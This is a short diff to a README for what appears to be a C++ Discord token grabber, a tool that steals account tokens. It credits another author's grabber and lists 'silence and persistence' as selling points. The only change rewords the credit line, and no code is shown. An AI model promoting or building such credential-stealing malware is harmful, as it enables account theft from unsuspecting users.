@@ -7,7 +7,7 @@
 </p>
 
 A C++ token grabber that anyone can use, credit to [NightFallGT](https://github.com/NightfallGT/Discord-Token-Grabber/blob/master/Token-Disc/Token-Disc.cpp)
-and his token grabber, I used it and created a more understandable and simple version of his.
+and his token grabber, I used it to create this.
 
 ## Pros
      - Silence and persistence
